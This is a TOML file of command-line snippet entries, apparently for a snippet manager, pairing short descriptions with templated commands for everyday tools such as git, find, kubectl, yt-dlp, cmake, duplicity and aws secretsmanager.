[[snippets]]
  description = "Simulate uninstalling a package without making any changes"
  command = "tlmgr remove --dry-run <package>"
  output = ""

[[snippets]]
  description = "Uninstall a package without its dependencies"
  command = "sudo tlmgr remove --no-depends <package>"
  output = ""

[[snippets]]
  description = "Uninstall a package and back it up to a specific directory"
  command = "sudo tlmgr remove --backupdir <path/to/directory> <package>"
  output = ""

[[snippets]]
  description = "Uninstall all of TeX Live, asking for confirmation"
  command = "sudo tlmgr remove --all"
  output = ""

[[snippets]]
  description = "View a compressed file"
  command = "xzless <path/to/file>"
  output = ""

[[snippets]]
  description = "View a compressed file and display line numbers"
  command = "xzless --LINE-NUMBERS <path/to/file>"
  output = ""

[[snippets]]
  description = "View a compressed file and quit if the entire file can be displayed on the first screen"
  command = "xzless --quit-if-one-screen <path/to/file>"
  output = ""

[[snippets]]
  description = "Compile a file to an object file"
  command = "adscript --output <path/to/file.o> <path/to/input_file.adscript>"
  output = ""

[[snippets]]
  description = "Compile and link a file to a standalone executable"
  command = "adscript --executable --output <path/to/file> <path/to/input_file.adscript>"
  output = ""

[[snippets]]
  description = "Compile a file to LLVM IR instead of native machine code"
  command = "adscript --llvm-ir --output <path/to/file.ll> <path/to/input_file.adscript>"
  output = ""

[[snippets]]
  description = "Cross-compile a file to an object file for a foreign CPU architecture or operating system"
  command = "adscript --target-triple <i386-linux-elf> --output <path/to/file.o> <path/to/input_file.adscript>"
  output = ""

[[snippets]]
  description = "Compare all changed files"
  command = "git diff-files"
  output = ""

[[snippets]]
  description = "Compare only specified files"
  command = "git diff-files <path/to/file>"
  output = ""

[[snippets]]
  description = "Show only the names of changed files"
  command = "git diff-files --name-only"
  output = ""

[[snippets]]
  description = "Output a summary of extended header information"
  command = "git diff-files --summary"
  output = ""

[[snippets]]
  description = "Lookup A, AAAA, and MX records of a domain"
  command = "host <domain>"
  output = ""

[[snippets]]
  description = "Lookup a field (CNAME, TXT,...) of a domain"
  command = "host -t <field> <domain>"
  output = ""

[[snippets]]
  description = "Reverse lookup an IP"
  command = "host <ip_address>"
  output = ""

[[snippets]]
  description = "Specify an alternate DNS server to query"
  command = "host <domain> <8.8.8.8>"
  output = ""

[[snippets]]
  description = "Merge the merge request associated with the current branch interactively"
  command = "glab mr merge"
  output = ""

[[snippets]]
  description = "Merge the specified merge request, interactively"
  command = "glab mr merge <mr_number>"
  output = ""

[[snippets]]
  description = "Merge the merge request, removing the branch on both the local and the remote"
  command = "glab mr merge --remove-source-branch"
  output = ""

[[snippets]]
  description = "Squash the current merge request into one commit with the message body and merge"
  command = "glab mr merge --squash --message=""<commit_message_body>"""
  output = ""

[[snippets]]
  description = "Display help"
  command = "glab mr merge --help"
  output = ""

[[snippets]]
  description = "Create a new flake (just the `flake.nix` file) from the default template, in the current directory"
  command = "nix flake init"
  output = ""

[[snippets]]
  description = "Update all inputs (dependencies) of the flake in the current directory"
  command = "nix flake update"
  output = ""

[[snippets]]
  description = "Update a specific input (dependency) of the flake in the current directory"
  command = "nix flake lock --update-input <input>"
  output = ""

[[snippets]]
  description = "Show all the outputs of a flake on github"
  command = "nix flake show <github:owner/repo>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "nix flake --help"
  output = ""

[[snippets]]
  description = "Start Dario's interactive CLI"
  command = "vladimyr"
  output = ""

[[snippets]]
  description = "Create a database at `/usr/local/var/postgres`"
  command = "initdb -D /usr/local/var/postgres"
  output = ""

[[snippets]]
  description = "Find files by extension"
  command = "find <root_path> -name '<*.ext>'"
  output = ""

[[snippets]]
  description = "Find files matching multiple path/name patterns"
  command = "find <root_path> -path '<**/path/**/*.ext>' -or -name '<*pattern*>'"
  output = ""

[[snippets]]
  description = "Find directories matching a given name, in case-insensitive mode"
  command = "find <root_path> -type d -iname '<*lib*>'"
  output = ""

[[snippets]]
  description = "Find files matching a given pattern, excluding specific paths"
  command = "find <root_path> -name '<*.py>' -not -path '<*/site-packages/*>'"
  output = ""

[[snippets]]
  description = "Find files matching a given size range, limiting the recursive depth to "1""
  command = "find <root_path> -maxdepth 1 -size <+500k> -size <-10M>"
  output = ""

[[snippets]]
  description = "Run a command for each file (use `{}` within the command to access the filename)"
  command = "find <root_path> -name '<*.ext>' -exec <wc -l> {} \;"
  output = ""

[[snippets]]
  description = "Find all files modified today and pass the results to a single command as arguments"
  command = "find <root_path> -daystart -mtime <-1> -exec <tar -cvf archive.tar> {} \+"
  output = ""

[[snippets]]
  description = "Find empty (0 byte) files and delete them"
  command = "find <root_path> -type <f> -empty -delete"
  output = ""

[[snippets]]
  description = "Run all tests defined in the CMake project, executing 4 jobs at a time in parallel"
  command = "ctest -j<4> --output-on-failure"
  output = ""

[[snippets]]
  description = "List available tests"
  command = "ctest -N"
  output = ""

[[snippets]]
  description = "Run a single test based on its name, or filter on a regular expression"
  command = "ctest --output-on-failure -R '^<test_name>$'"
  output = ""

[[snippets]]
  description = "Create a local branch"
  command = "git create-branch <branch_name>"
  output = ""

[[snippets]]
  description = "Create a branch locally and on origin"
  command = "git create-branch --remote <branch_name>"
  output = ""

[[snippets]]
  description = "Create a branch locally and on upstream (through forks)"
  command = "git create-branch --remote upstream <branch_name>"
  output = ""

[[snippets]]
  description = "Set a secret for the current repository (user will be prompted for the value)"
  command = "gh secret set <name>"
  output = ""

[[snippets]]
  description = "Set a secret from a file for the current repository"
  command = "gh secret set <name> < <path/to/file>"
  output = ""

[[snippets]]
  description = "Set a secret for a specific repository"
  command = "gh secret set <name> --body <value> --repo <owner>/<repository>"
  output = ""

[[snippets]]
  description = "Set an organization secret for specific repositories"
  command = "gh secret set <name> --org <organization> --repos ""<repository1,repository2,...>"""
  output = ""

[[snippets]]
  description = "Set an organization secret with a specific visibility"
  command = "gh secret set <name> --org <organization> --visibility <all|private|selected>"
  output = ""

[[snippets]]
  description = "Start quote mode with the builtin quote list in English"
  command = "tt -quotes <en>"
  output = ""

[[snippets]]
  description = "Produce a test consisting of 50 randomly drawn words in 5 groups of 10 words each"
  command = "tt -n <10> -g <5>"
  output = ""

[[snippets]]
  description = "Start a timed test lasting 10 seconds"
  command = "tt -t <10>"
  output = ""

[[snippets]]
  description = "Start `tt` with no theming and showing your WPM as you type"
  command = "tt -showwpm -notheme"
  output = ""

[[snippets]]
  description = "List information about a resource with more details"
  command = "kubectl get <pod|service|deployment|ingress|...> -o wide"
  output = ""

[[snippets]]
  description = "Update specified pod with the label 'unhealthy' and the value 'true'"
  command = "kubectl label pods <name> unhealthy=true"
  output = ""

[[snippets]]
  description = "List all resources with different types"
  command = "kubectl get all"
  output = ""

[[snippets]]
  description = "Display resource (CPU/Memory/Storage) usage of nodes or pods"
  command = "kubectl top <pod|node>"
  output = ""

[[snippets]]
  description = "Print the address of the master and cluster services"
  command = "kubectl cluster-info"
  output = ""

[[snippets]]
  description = "Display an explanation of a specific field"
  command = "kubectl explain <pods.spec.containers>"
  output = ""

[[snippets]]
  description = "Print the logs for a container in a pod or specified resource"
  command = "kubectl logs <pod_name>"
  output = ""

[[snippets]]
  description = "Run command in an existing pod"
  command = "kubectl exec <pod_name> -- <ls />"
  output = ""

[[snippets]]
  description = "Execute the `ls` program literally, even if an `ls` alias exists"
  command = "command <ls>"
  output = ""

[[snippets]]
  description = "Display the path to the executable or the alias definition of a specific command"
  command = "command -v <command_name>"
  output = ""

[[snippets]]
  description = "Download a video or playlist (with the default options from command below)"
  command = "yt-dlp ""<https://www.youtube.com/watch?v=oHg5SJYRHA0>"""
  output = ""

[[snippets]]
  description = "List the available downloadable formats for a video"
  command = "yt-dlp --list-formats ""<https://www.youtube.com/watch?v=oHg5SJYRHA0>"""
  output = ""

[[snippets]]
  description = "Download a video with a defined format, in this case the best mp4 video available (default is "bv\*+ba/b")"
  command = "yt-dlp --format ""<bv*[ext=mp4]+ba[ext=m4a]/b[ext=mp4]>"" ""<https://www.youtube.com/watch?v=oHg5SJYRHA0>"""
  output = ""

[[snippets]]
  description = "Extract audio from a video (requires ffmpeg or ffprobe)"
  command = "yt-dlp --extract-audio ""<https://www.youtube.com/watch?v=oHg5SJYRHA0>"""
  output = ""

[[snippets]]
  description = "Specify audio format and audio quality of extracted audio (between 0 (best) and 10 (worst), default = 5)"
  command = "yt-dlp --extract-audio --audio-format <mp3> --audio-quality <0> ""<https://www.youtube.com/watch?v=oHg5SJYRHA0>"""
  output = ""

[[snippets]]
  description = "Download all playlists of YouTube channel/user keeping each playlist in separate directory"
  command = "yt-dlp -o ""<%(uploader)s/%(playlist)s/%(playlist_index)s - %(title)s.%(ext)s>"" ""<https://www.youtube.com/user/TheLinuxFoundation/playlists>"""
  output = ""

[[snippets]]
  description = "Download Udemy course keeping each chapter in separate directory under MyVideos directory in your home"
  command = "yt-dlp -u <user> -p <password> -P ""<~/MyVideos>"" -o ""<%(playlist)s/%(chapter_number)s - %(chapter)s/%(title)s.%(ext)s>"" ""<https://www.udemy.com/java-tutorial>"""
  output = ""

[[snippets]]
  description = "Download entire series season keeping each series and each season in separate directory under C:/MyVideos"
  command = "yt-dlp -P ""<C:/MyVideos>"" -o ""<%(series)s/%(season_number)s - %(season)s/%(episode_number)s - %(episode)s.%(ext)s>"" ""<https://videomore.ru/kino_v_detalayah/5_sezon/367617>"""
  output = ""

[[snippets]]
  description = "Connect to a local database on the default port (`mongodb://localhost:27017`)"
  command = "mongo"
  output = ""

[[snippets]]
  description = "Connect to a database"
  command = "mongo --host <host> --port <port> <db_name>"
  output = ""

[[snippets]]
  description = "Authenticate using the specified username on the specified database (you will be prompted for a password)"
  command = "mongo --host <host> --port <port> --username <username> --authenticationDatabase <authdb_name> <db_name>"
  output = ""

[[snippets]]
  description = "Evaluate a JavaScript expression on a database"
  command = "mongo --eval '<JSON.stringify(db.foo.findOne())>' <db_name>"
  output = ""

[[snippets]]
  description = "Apply the default style of 4 spaces per indent and no formatting changes"
  command = "astyle <source_file>"
  output = ""

[[snippets]]
  description = "Apply the Java style with attached braces"
  command = "astyle --style=java <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply the allman style with broken braces"
  command = "astyle --style=allman <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply a custom indent using spaces. Choose between 2 and 20 spaces"
  command = "astyle --indent=spaces=<number_of_spaces> <path/to/file>"
  output = ""

[[snippets]]
  description = "Apply a custom indent using tabs. Choose between 2 and 20 tabs"
  command = "astyle --indent=tab=<number_of_tabs> <path/to/file>"
  output = ""

[[snippets]]
  description = "Log in to Private Internet Access"
  command = "piactl login <path/to/login_file>"
  output = ""

[[snippets]]
  description = "Connect to Private Internet Access"
  command = "piactl connect"
  output = ""

[[snippets]]
  description = "Disconnect from Private Internet Access"
  command = "piactl disconnect"
  output = ""

[[snippets]]
  description = "Enable or disable the Private Internet Access daemon in the background"
  command = "piactl background <enable|disable>"
  output = ""

[[snippets]]
  description = "List all available VPN regions"
  command = "piactl get regions"
  output = ""

[[snippets]]
  description = "Display the current VPN region"
  command = "piactl get region"
  output = ""

[[snippets]]
  description = "Set your VPN region"
  command = "piactl set region <region>"
  output = ""

[[snippets]]
  description = "Log out of Private Internet Access"
  command = "piactl logout"
  output = ""

[[snippets]]
  description = "Install packages from a Brewfile at the current path"
  command = "brew bundle"
  output = ""

[[snippets]]
  description = "Install packages from a specific Brewfile at a specific path"
  command = "brew bundle --file=<path/to/file>"
  output = ""

[[snippets]]
  description = "Create a Brewfile from all installed packages"
  command = "brew bundle dump"
  output = ""

[[snippets]]
  description = "Uninstall all formulae not listed in the Brewfile"
  command = "brew bundle cleanup --force"
  output = ""

[[snippets]]
  description = "Check if there is anything to install or upgrade in the Brewfile"
  command = "brew bundle check"
  output = ""

[[snippets]]
  description = "List all entries in the Brewfile"
  command = "brew bundle list --all"
  output = ""

[[snippets]]
  description = "Display information about currently logged in users"
  command = "finger"
  output = ""

[[snippets]]
  description = "Display information about a specific user"
  command = "finger <username>"
  output = ""

[[snippets]]
  description = "Display the user's login name, real name, terminal name, and other information"
  command = "finger -s"
  output = ""

[[snippets]]
  description = "Produce multiline output format displaying same information as `-s` as well as user's home directory, home phone number, login shell, mail status, etc."
  command = "finger -l"
  output = ""

[[snippets]]
  description = "Prevent matching against user's names and only use login names"
  command = "finger -m"
  output = ""

[[snippets]]
  description = "Backup a directory via FTPS to a remote machine, encrypting it with a password"
  command = "FTP_PASSWORD=<ftp_login_password> PASSPHRASE=<encryption_password> duplicity <path/to/source/directory> <ftps://user@hostname/target/directory/path/>"
  output = ""

[[snippets]]
  description = "Backup a directory to Amazon S3, doing a full backup every month"
  command = "duplicity --full-if-older-than <1M> s3://<bucket_name[/prefix]>"
  output = ""

[[snippets]]
  description = "Delete versions older than 1 year from a backup stored on a WebDAV share"
  command = "FTP_PASSWORD=<webdav_login_password> duplicity remove-older-than <1Y> --force <webdav[s]://user@hostname[:port]/some_dir>"
  output = ""

[[snippets]]
  description = "List the available backups"
  command = "duplicity collection-status ""file://<absolute/path/to/backup/directory>"""
  output = ""

[[snippets]]
  description = "List the files in a backup stored on a remote machine, via ssh"
  command = "duplicity list-current-files --time <YYYY-MM-DD> scp://<user@hostname>/<path/to/backup/dir>"
  output = ""

[[snippets]]
  description = "Restore a subdirectory from a GnuPG-encrypted local backup to a given location"
  command = "PASSPHRASE=<gpg_key_password> duplicity restore --encrypt-key <gpg_key_id> --path-to-restore <relative/path/restoredirectory> file://<absolute/path/to/backup/directory> <path/to/directory/to/restore/to>"
  output = ""

[[snippets]]
  description = "Authenticate with and save concourse target"
  command = "fly --target <target_name> login --team-name <team_name> -c <https://ci.example.com>"
  output = ""

[[snippets]]
  description = "List targets"
  command = "fly targets"
  output = ""

[[snippets]]
  description = "List pipelines"
  command = "fly -t <target_name> pipelines"
  output = ""

[[snippets]]
  description = "Upload or update a pipeline"
  command = "fly -t <target_name> set-pipeline --config <pipeline.yml> --pipeline <pipeline_name>"
  output = ""

[[snippets]]
  description = "Unpause pipeline"
  command = "fly -t <target_name> unpause-pipeline --pipeline <pipeline_name>"
  output = ""

[[snippets]]
  description = "Show pipeline configuration"
  command = "fly -t <target_name> get-pipeline --pipeline <pipeline_name>"
  output = ""

[[snippets]]
  description = "Update local copy of fly"
  command = "fly -t <target_name> sync"
  output = ""

[[snippets]]
  description = "Destroy pipeline"
  command = "fly -t <target_name> destroy-pipeline --pipeline <pipeline_name>"
  output = ""

[[snippets]]
  description = "Scan a binary file"
  command = "binwalk <path/to/binary>"
  output = ""

[[snippets]]
  description = "Extract files from a binary, specifying the output directory"
  command = "binwalk --extract --directory <output_directory> <path/to/binary>"
  output = ""

[[snippets]]
  description = "Recursively extract files from a binary limiting the recursion depth to 2"
  command = "binwalk --extract --matryoshka --depth <2> <path/to/binary>"
  output = ""

[[snippets]]
  description = "Extract files from a binary with the specified file signature"
  command = "binwalk --dd '<png image:png>' <path/to/binary>"
  output = ""

[[snippets]]
  description = "Analyze the entropy of a binary, saving the plot with the same name as the binary and `.png` extension appended"
  command = "binwalk --entropy --save <path/to/binary>"
  output = ""

[[snippets]]
  description = "Combine entropy, signature and opcodes analysis in a single command"
  command = "binwalk --entropy --signature --opcodes <path/to/binary>"
  output = ""

[[snippets]]
  description = "Generate a build recipe in the current directory with `CMakeLists.txt` from a project directory"
  command = "cmake <path/to/project_directory>"
  output = ""

[[snippets]]
  description = "Generate a build recipe, with build type set to `Release` with CMake variable"
  command = "cmake <path/to/project_directory> -D <CMAKE_BUILD_TYPE=Release>"
  output = ""

[[snippets]]
  description = "Generate a build recipe using `generator_name` as the underlying build system"
  command = "cmake -G <generator_name> <path/to/project_directory>"
  output = ""

[[snippets]]
  description = "Use a generated recipe in a given directory to build artifacts"
  command = "cmake --build <path/to/build_directory>"
  output = ""

[[snippets]]
  description = "Install the build artifacts into `/usr/local/` and strip debugging symbols"
  command = "cmake --install <path/to/build_directory> --strip"
  output = ""

[[snippets]]
  description = "Install the build artifacts using the custom prefix for paths"
  command = "cmake --install <path/to/build_directory> --strip --prefix <path/to/directory>"
  output = ""

[[snippets]]
  description = "Run a custom build target"
  command = "cmake --build <path/to/build_directory> --target <target_name>"
  output = ""

[[snippets]]
  description = "Display help, obtain a list of generators"
  command = "cmake --help"
  output = ""

[[snippets]]
  description = "Run on server"
  command = "iperf -s"
  output = ""

[[snippets]]
  description = "Run on server using UDP mode and set server port to listen on 5001"
  command = "iperf -u -s -p <5001>"
  output = ""

[[snippets]]
  description = "Run on client"
  command = "iperf -c <server_address>"
  output = ""

[[snippets]]
  description = "Run on client every 2 seconds"
  command = "iperf -c <server_address> -i <2>"
  output = ""

[[snippets]]
  description = "Run on client with 5 parallel threads"
  command = "iperf -c <server_address> -P <5>"
  output = ""

[[snippets]]
  description = "Run on client using UDP mode"
  command = "iperf -u -c <server_address> -p <5001>"
  output = ""

[[snippets]]
  description = "Show secrets stored by the secrets manager in the current account"
  command = "aws secretsmanager list-secrets"
  output = ""

[[snippets]]
  description = "Create a secret"
  command = "aws secretsmanager create-secret --name <name> --description ""<secret_description>"" --secret-string <secret>"
  output = ""

[[snippets]]
  description = "Delete a secret"
  command = "aws secretsmanager delete-secret --secret-id <name_or_arn>"
  output = ""

[[snippets]]
  description = "View details of a secret except for secret text"
  command = "aws secretsmanager describe-secret --secret-id <name_or_arn>"
  output = ""

[[snippets]]
  description = "Retrieve the value of a secret (to get the latest version of the secret omit `--version-stage`)"
  command = "aws secretsmanager get-secret-value --secret-id <name_or_arn> --version-stage <version_of_secret>"
  output = ""

[[snippets]]
  description = "Rotate the secret immediately using a Lambda function"
  command = "aws secretsmanager rotate-secret --secret-id <name_or_arn> --rotation-lambda-arn <arn_of_lambda_function>"
  output = ""

[[snippets]]
  description = "Rotate the secret automatically every 30 days using a Lambda function"
  command = "aws secretsmanager rotate-secret --secret-id <name_or_arn> --rotation-lambda-arn <arn_of_lambda_function> --rotation-rules AutomaticallyAfterDays=<30>"
  output = ""

[[snippets]]
  description = "Send feedback to the Azure CLI Team"
  command = "az feedback"
  output = ""

[[snippets]]
  description = "Convert a PNM image to a DDIF image file"
  command = "pnmtoddif <path/to/image.pnm> > <path/to/image.ddif>"
  output = ""

[[snippets]]
  description = "Explicitly specify the horizontal and vertical resolution of the output image"
  command = "pnmtoddif -resolution <horizontal_dpi> <vertical_dpi> <path/to/image.pnm> > <path/to/image.ddif>"
  output = ""

[[snippets]]
  description = "Overlay two images such with the overlay blocking parts of the underlay"
  command = "pamcomp <path/to/overlay.pam> <path/to/underlay.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Set the horizontal alignment of the overlay"
  command = "pamcomp -align <left|center|right|beyondleft|beyondright> -xoff <x_offset> <path/to/overlay.pam> <path/to/underlay.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Set the vertical alignment of the overlay"
  command = "pamcomp -valign <top|middle|bottom|above|below> -yoff <y_offset> <path/to/overlay.pam> <path/to/underlay.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Set the opacity of the overlay"
  command = "pamcomp -opacity <0.7> <path/to/overlay.pam> <path/to/underlay.pam> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Install Cradle's components (User will be prompted for further details)"
  command = "cradle install"
  output = ""

[[snippets]]
  description = "Forcefully overwrite files"
  command = "cradle install --force"
  output = ""

[[snippets]]
  description = "Skip running SQL migrations"
  command = "cradle install --skip-sql"
  output = ""

[[snippets]]
  description = "Skip running package updates"
  command = "cradle install --skip-versioning"
  output = ""

[[snippets]]
  description = "Use specific database details"
  command = "cradle install -h <hostname> -u <username> -p <password>"
  output = ""

[[snippets]]
  description = "[a]rchive a file or directory"
  command = "7za a <path/to/archive.7z> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Encrypt an existing archive (including file names)"
  command = "7za a <path/to/encrypted.7z> -p<password> -mhe=<on> <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive preserving the original directory structure"
  command = "7za x <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to a specific directory"
  command = "7za x <path/to/archive.7z> -o<path/to/output>"
  output = ""

[[snippets]]
  description = "E[x]tract an archive to `stdout`"
  command = "7za x <path/to/archive.7z> -so"
  output = ""

[[snippets]]
  description = "[a]rchive using a specific archive type"
  command = "7za a -t<7z|bzip2|gzip|lzip|tar|...> <path/to/archive.7z> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "[l]ist the contents of an archive"
  command = "7za l <path/to/archive.7z>"
  output = ""

[[snippets]]
  description = "Set the level of compression (higher means more compression, but slower)"
  command = "7za a <path/to/archive.7z> -mx=<0|1|3|5|7|9> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Print documentation on a subject (Python keyword, topic, function, module, package, etc.)"
  command = "pydoc <subject>"
  output = ""

[[snippets]]
  description = "Start an HTTP server on an arbitrary unused port and open a [b]rowser to see the documentation"
  command = "pydoc -b"
  output = ""

[[snippets]]
  description = "Display help"
  command = "pydoc"
  output = ""

[[snippets]]
  description = "Open two files and show the differences"
  command = "vimdiff <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Move the cursor to the window on the left|right"
  command = "<Ctrl> + w <h|l>"
  output = ""

[[snippets]]
  description = "Jump to the previous difference"
  command = "[c"
  output = ""

[[snippets]]
  description = "Jump to the next difference"
  command = "]c"
  output = ""

[[snippets]]
  description = "Copy the highlighted difference from the other window to the current window"
  command = "do"
  output = ""

[[snippets]]
  description = "Copy the highlighted difference from the current window to the other window"
  command = "dp"
  output = ""

[[snippets]]
  description = "Update all highlights and folds"
  command = ":diffupdate"
  output = ""

[[snippets]]
  description = "Toggle the highlighted code fold"
  command = "za"
  output = ""

[[snippets]]
  description = "Call the first target specified in the Makefile (usually named "all")"
  command = "make"
  output = ""

[[snippets]]
  description = "Call a specific target"
  command = "make <target>"
  output = ""

[[snippets]]
  description = "Call a specific target, executing 4 jobs at a time in parallel"
  command = "make -j<4> <target>"
  output = ""

[[snippets]]
  description = "Use a specific Makefile"
  command = "make --file <path/to/file>"
  output = ""

[[snippets]]
  description = "Execute make from another directory"
  command = "make --directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Force making of a target, even if source files are unchanged"
  command = "make --always-make <target>"
  output = ""

[[snippets]]
  description = "Override a variable defined in the Makefile"
  command = "make <target> <variable>=<new_value>"
  output = ""

[[snippets]]
  description = "Override variables defined in the Makefile by the environment"
  command = "make --environment-overrides <target>"
  output = ""

[[snippets]]
  description = "Run all tests in all environments of the current PlatformIO project"
  command = "pio test"
  output = ""

[[snippets]]
  description = "Test only specific environments"
  command = "pio test --environment <environment1> --environment <environment2>"
  output = ""

[[snippets]]
  description = "Run only tests whose name matches a specific glob pattern"
  command = "pio test --filter ""<pattern>"""
  output = ""

[[snippets]]
  description = "Ignore tests whose name matches a specific glob pattern"
  command = "pio test --ignore ""<pattern>"""
  output = ""

[[snippets]]
  description = "Specify a port for firmware uploading"
  command = "pio test --upload-port <upload_port>"
  output = ""

[[snippets]]
  description = "Specify a custom configuration file for running the tests"
  command = "pio test --project-conf <path/to/platformio.ini>"
  output = ""

[[snippets]]
  description = "Apply default optimizations and write to a given file"
  command = "wasm-opt -O <input.wasm> -o <output.wasm>"
  output = ""

[[snippets]]
  description = "Apply all optimizations and write to a given file (takes more time, but generates optimal code)"
  command = "wasm-opt -O4 <input.wasm> -o <output.wasm>"
  output = ""

[[snippets]]
  description = "Optimize a file for size"
  command = "wasm-opt -Oz <input.wasm> -o <output.wasm>"
  output = ""

[[snippets]]
  description = "Print the textual representation of the binary to console"
  command = "wasm-opt <input.wasm> --print"
  output = ""

[[snippets]]
  description = "Create a repository in the local filesystem"
  command = "kopia repository create filesystem --path <path/to/local_repository>"
  output = ""

[[snippets]]
  description = "Create a repository on Amazon S3"
  command = "kopia repository create s3 --bucket <bucket_name> --access-key <AWS_access_key_id> --secret-access-key <AWS_secret_access_key>"
  output = ""

[[snippets]]
  description = "Connect to a repository"
  command = "kopia repository connect <repository_type> --path <path/to/repository>"
  output = ""

[[snippets]]
  description = "Create a snapshot of a directory"
  command = "kopia snapshot create <path/to/directory>"
  output = ""

[[snippets]]
  description = "List snapshots"
  command = "kopia snapshot list"
  output = ""

[[snippets]]
  description = "Restore a snapshot to a specific directory"
  command = "kopia snapshot restore <snapshot_id> <path/to/target_directory>"
  output = ""

[[snippets]]
  description = "Create a new policy"
  command = "kopia policy set --global --keep-latest <number_of_snapshots_to_keep> --compression <compression_algorithm>"
  output = ""

[[snippets]]
  description = "Ignore a specific file or folder from backups"
  command = "kopia policy set --global --add-ignore <path/to/file_or_folder>"
  output = ""

[[snippets]]
  description = "Take a picture"
  command = "fswebcam <filename>"
  output = ""

[[snippets]]
  description = "Take a picture with custom resolution"
  command = "fswebcam -r <width>x<height> <filename>"
  output = ""

[[snippets]]
  description = "Take a picture from selected device(Default is `/dev/video0`)"
  command = "fswebcam -d <device> <filename>"
  output = ""

[[snippets]]
  description = "Take a picture with timestamp(timestamp string is formatted by strftime)"
  command = "fswebcam --timestamp <timestamp> <filename>"
  output = ""

[[snippets]]
  description = "Validate a device by checking the files in a given directory"
  command = "f3read <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "bzip3 <path/to/file_to_compress>"
  output = ""

[[snippets]]
  description = "[d]ecompress a file"
  command = "bzip3 -d <path/to/compressed_file.bz3>"
  output = ""

[[snippets]]
  description = "Decompress a file to `stdout` ([c])"
  command = "bzip3 -dc <path/to/compressed_file.bz3>"
  output = ""

[[snippets]]
  description = "Test the integrity of each file inside the archive file"
  command = "bzip3 --test <path/to/compressed_file.bz3>"
  output = ""

[[snippets]]
  description = "Show the compression ratio for each file processed with detailed information"
  command = "bzip3 --verbose <path/to/compressed_files.bz3>"
  output = ""

[[snippets]]
  description = "Decompress a file overwriting existing files"
  command = "bzip3 -d --force <path/to/compressed_file.bz3>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "bzip3 -h"
  output = ""

[[snippets]]
  description = "Open a specific directory"
  command = "phpstorm <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "phpstorm <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file at a specific line"
  command = "phpstorm --line <line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "View the differences between two files"
  command = "phpstorm diff <path/to/left_file> <path/to/right_file>"
  output = ""

[[snippets]]
  description = "Check a single Python file"
  command = "pyflakes check <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Check Python files in a specific directory"
  command = "pyflakes checkPath <path/to/directory>"
  output = ""

[[snippets]]
  description = "Check Python files in a directory recursively"
  command = "pyflakes checkRecursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Check all Python files found in multiple directories"
  command = "pyflakes iterSourceCode <path/to/directory_1> <path/to/directory_2>"
  output = ""

[[snippets]]
  description = "Compress a file"
  command = "ect <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a file with specified compression level and multithreading (1=Fastest (Worst), 9=Slowest (Best), default is 3)"
  command = "ect -<9> --mt-deflate <path/to/file.zip>"
  output = ""

[[snippets]]
  description = "Compress all files in a directory recursively"
  command = "ect -recurse <path/to/directory>"
  output = ""

[[snippets]]
  description = "Compress a file, keeping the original modification time"
  command = "ect -keep <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Compress a file, stripping metadata"
  command = "ect -strip <path/to/file.png>"
  output = ""

[[snippets]]
  description = "Insert a new entry with your editor"
  command = "jrnl"
  output = ""

[[snippets]]
  description = "Quickly insert a new entry"
  command = "jrnl <today at 3am>: <title>. <content>"
  output = ""

[[snippets]]
  description = "View the last ten entries"
  command = "jrnl -n <10>"
  output = ""

[[snippets]]
  description = "View everything that happened from the start of last year to the start of last march"
  command = "jrnl -from ""<last year>"" -until <march>"
  output = ""

[[snippets]]
  description = "Edit all entries tagged with "texas" and "history""
  command = "jrnl <@texas> -and <@history> --edit"
  output = ""

[[snippets]]
  description = "Check the Go package in the current directory"
  command = "go vet"
  output = ""

[[snippets]]
  description = "Check the Go package in the specified path"
  command = "go vet <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "List available checks that can be run with go vet"
  command = "go tool vet help"
  output = ""

[[snippets]]
  description = "View details and flags for a particular check"
  command = "go tool vet help <check_name>"
  output = ""

[[snippets]]
  description = "Display offending lines plus N lines of surrounding context"
  command = "go vet -c=<N>"
  output = ""

[[snippets]]
  description = "Output analysis and errors in JSON format"
  command = "go vet -json"
  output = ""

[[snippets]]
  description = "Read OCaml commands from the user and execute them"
  command = "ocaml"
  output = ""

[[snippets]]
  description = "Read OCaml commands from a file and execute them"
  command = "ocaml <path/to/file.ml>"
  output = ""

[[snippets]]
  description = "Run OCaml script with modules"
  command = "ocaml <module1> <module2> <path/to/file.ml>"
  output = ""

[[snippets]]
  description = "Archive 1 or more files"
  command = "rar a <path/to/archive_name.rar> <path/to/file1> <path/to/file2> <path/to/file3>"
  output = ""

[[snippets]]
  description = "Archive a directory"
  command = "rar a <path/to/archive_name.rar> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Split the archive into parts of equal size (50M)"
  command = "rar a -v<50M> -R <path/to/archive_name.rar> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Password protect the resulting archive"
  command = "rar a -p<password> <path/to/archive_name.rar> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Encrypt file data and headers with password"
  command = "rar a -hp<password> <path/to/archive_name.rar> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Use a specific compression level (0-5)"
  command = "rar a -m<compression_level> <path/to/archive_name.rar> <path/to/file_or_directory>"
  output = ""

[[snippets]]
  description = "Execute the specified file and watch a specific file for changes"
  command = "nodemon <path/to/file.js>"
  output = ""

[[snippets]]
